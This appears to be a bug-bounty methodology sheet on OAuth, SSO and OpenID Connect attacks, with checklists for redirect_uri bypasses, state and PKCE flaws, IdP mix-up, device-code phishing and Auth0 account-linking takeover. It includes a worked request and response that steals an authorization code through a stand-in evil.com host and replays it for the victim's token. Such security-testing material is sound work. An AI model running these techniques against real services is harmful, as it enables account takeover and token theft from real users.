# OAuth / SSO / OpenID

**What it is:** Flaws in delegated-auth flows → token theft, account takeover, auth bypass.

## Test steps
- [ ] `redirect_uri` manipulation: append/change to attacker domain, use `//evil`, `?`, `#`, path suffix, subdomain, open-redirect chain on a whitelisted host → steal `code`/`token`.
- [ ] `state` missing/not validated → CSRF on the OAuth flow (force-link attacker account).
- [ ] Steal `code` via referer leak / open redirect, replay it (codes reusable? expiry?).
- [ ] Implicit flow token leak in URL fragment → referer/history.
- [ ] Account linking: link victim's social account to your login (pre-account-takeover).
- [ ] Email not verified by IdP but trusted by app → sign in as victim.
- [ ] `scope` escalation — request more scopes, or downgrade checks.
- [ ] Swap `code`/`token` between accounts (IDOR at the callback).
- [ ] `client_secret` leaked in JS/mobile → forge token requests.
- [ ] Login CSRF: no state → attacker logs victim into attacker's account (data capture).
- [ ] Reuse of authorization code across clients.

## Account-linking & magic-link logic (see `09-email-invite-flow-abuse.md`)
- [ ] Link your social identity to a victim's existing account (pre-ATO).
- [ ] Magic-link reuse / no expiry / not device-bound.
- [ ] Stale invite/onboarding token binds to the wrong account.
- [ ] IdP email unverified but app trusts it → sign in as victim.

## Impact
Full account takeover, auth bypass.

## Tools
Burp, manual flow tracing, Collaborator for redirect exfil.

## 🎯 PoC — Request → Response (redirect_uri code theft)

**Tamper `redirect_uri` to an attacker host on a weak validator:**
```http
GET /oauth2/authorize?client_id=web-prod&response_type=code&scope=openid%20profile&state=xyz&redirect_uri=https://target.com.evil.com/cb HTTP/2
Host: idp.target.com
Cookie: sso_session=<victim>
```
```http
HTTP/2 302 Found
Location: https://target.com.evil.com/cb?code=4/0Adeu...&state=xyz
```
The IdP sent the victim's `code` to `evil.com`. Attacker replays it at the real callback:
```http
POST /oauth2/token HTTP/2
Host: idp.target.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=4/0Adeu...&redirect_uri=https://target.com.evil.com/cb&client_id=web-prod
```
```http
HTTP/2 200 OK
{"access_token":"ya29...","id_token":"eyJ...","token_type":"Bearer"}   ← victim's session
```

## Deep cuts — OAuth/OIDC attacks the classic list misses
- [ ] **`redirect_uri` validator matrix:** path append `/../`, `%2f`, `%23`, `%3f`, `\`, `@evil`, `#@`, trailing `.`, unicode, subdomain (`evil.target.com`), open-redirect on a whitelisted host (redirect chain lands the `code` on you), `localhost`/loopback tricks, extra query keys, path traversal to a different registered app.
- [ ] **PKCE downgrade / omission:** drop `code_challenge` (server falls back to no-PKCE), or replay a `code` because `code_verifier` isn't enforced; downgrade `S256`→`plain`.
- [ ] **IdP mix-up / `iss` confusion:** with multiple IdPs, swap the `iss`/token endpoint so the client sends the code to the *honest* IdP's token endpoint using the *attacker* IdP's context → token confusion. Check `iss` is validated per RFC 9207.
- [ ] **Response-mode / response-type juggling:** switch `response_mode=form_post`→`query`/`fragment`, or `code`→`token`/`id_token` to leak creds where they weren't meant to land ("dirty dancing", `07`).
- [ ] **`state` / `nonce` weaknesses:** missing/static/predictable `state` = login-CSRF + account-linking; missing `nonce` = id_token replay.
- [ ] **Account-linking pre-ATO:** link your social identity to a victim's existing local account, or an unverified-email IdP trusted by the app → sign in as victim.
- [ ] **Token endpoint issues:** `code` reusable / long-lived / not bound to `client_id`; refresh-token no rotation; `client_secret` in JS/mobile → forge token requests; confidential client treated as public.
- [ ] **`scope` / consent bypass:** escalate scopes on the token request, or reuse a cached consent to add scopes silently; downgrade a scope check by omitting the param.
- [ ] **Device-code phishing (RFC 8628):** send a victim your `user_code`/verification URL; poll the token endpoint; on their approval you get the tokens. Check binding + display of the requesting app.
- [ ] **JAR/PAR/`request_uri` SSRF:** the AS fetches your `request_uri` → SSRF (`03-injection/06`); unsigned `request` object tamper.
- [ ] **postMessage/`window.opener` code leak:** the callback popup posts the `code`/token to `*` or an unchecked origin (`05-client-side/04`).
- [ ] **Dynamic client registration:** register a rogue client with an attacker `redirect_uri`/`logo_uri`(SSRF) if the endpoint is open.
- [ ] **Silent auth (`prompt=none`):** flow completes with no user interaction when a session exists → one-click ATO when chained with a redirect/leak.
- [ ] **Google `hd` domain escape:** change `hd=company.com`→`hd=gmail.com` (or drop it) to slip a hosted-domain restriction; also remove `email` from `scope` to dodge verification checks.

## Provider-specific
- [ ] **Auth0 signup on login-only tenants:** swap `/co/authenticate` → `/dbconnections/signup` (set `email`, `password`, `connection`/`realm`, valid `client_id`) to create accounts even when signup is "disabled" in the UI.
- [ ] **Auth0 account-linking ATO:** register the victim's email via `/dbconnections/signup` with your password, then the victim's "Log in with Google" links into your account (0-click if no email verification; 1-click after they confirm).
- [ ] **Auth0 email-normalization bypass:** register a Unicode look-alike (`vıctim@` vs `victim@`); if the Get-User script doesn't normalize but the Create script does, you overwrite/collide the real account.
- [ ] Auth0 needs the `client_id` + active `dbconnection` name (both extractable from requests) — enumerate them first.

## Report notes
Diagram the flow and show where the code/token leaks to you and that it grants victim access. Name the exact defect (redirect validator / PKCE / mix-up / state) and use accounts you control.
